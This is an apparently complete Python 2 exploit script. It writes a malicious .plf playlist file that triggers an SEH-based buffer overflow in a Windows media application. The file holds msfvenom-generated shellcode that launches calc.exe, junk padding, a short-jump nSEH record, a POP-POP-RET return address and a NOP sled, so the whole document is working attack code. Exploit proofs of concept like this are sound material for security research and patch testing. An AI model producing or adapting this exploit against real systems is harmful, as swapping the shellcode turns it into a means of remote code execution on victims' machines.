#!python

import struct

file = "playlist.plf"

# msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe
# -f python -b "\x0a\x1a" --smallest -v shellcode
shellcode =  ""
shellcode += "\x33\xc9\xb1\xc0\xe8\xff\xff\xff\xff\xc1\x5e\x30"
shellcode += "\x4c\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05\x06\x67"
shellcode += "\x81\xec\x3b\xcb\x68\x86\x5e\x3f\x9b\x43\x1e\x98"
shellcode += "\x46\x01\x9d\x65\x30\x16\xad\x51\x3a\x2c\xe1\xb3"
shellcode += "\x1c\x40\x5e\x21\x08\x05\xe7\xe8\x25\x28\xed\xc9"
shellcode += "\xde\x7f\x79\xa4\x62\x21\xb9\x79\x08\xbe\x7a\x26"
shellcode += "\x40\xda\x72\x3a\xed\x6c\xb5\x66\x60\x40\x91\xc8"
shellcode += "\x0d\x5d\xa5\x7d\x01\xc2\x7e\xc0\x4d\x9b\x7f\xb0"
shellcode += "\xfc\x90\x9d\x5e\x55\x92\x6e\xb7\x2d\xaf\x59\x26"
shellcode += "\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c\x41\x67\xb4"
shellcode += "\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa\x76\xf8"
shellcode += "\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d\x24\x24\x2e"
shellcode += "\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4\xe0\x8a"
shellcode += "\x01\x08\x3c\x8f\x90\x91\xc2\xfb\xa5\x1e\xf9\x10"
shellcode += "\x67\x4c\x21\x6b\x29\x3f\xc8\xf7\x06\x34\x1f\x3e"
shellcode += "\x5b\x70\x9a\xa1\xd4\xa3\x2a\x50\x4c\xd8\xab\x14"
shellcode += "\xf7\xa2\xc0\xdc\xde\xb5\xe5\x48\x6d\xda\xdb\xd7"
shellcode += "\xdf\x93\xdb\xc7\xa5\xc1"

junk = "A"*608
nSEH = "\xeb\x1e\x90\x90"
SEH = struct.pack('<L', 0x640393ad)
nop = "\x90"*30

payload = junk + nSEH + SEH + nop + shellcode
print "[+] Setting up payload at %s" % (file)
print "[+] SEH POP,POP,RET address 0x%08x" % (0x640393ad)

fd = open(file, 'w')
fd.write(payload)
fd.close
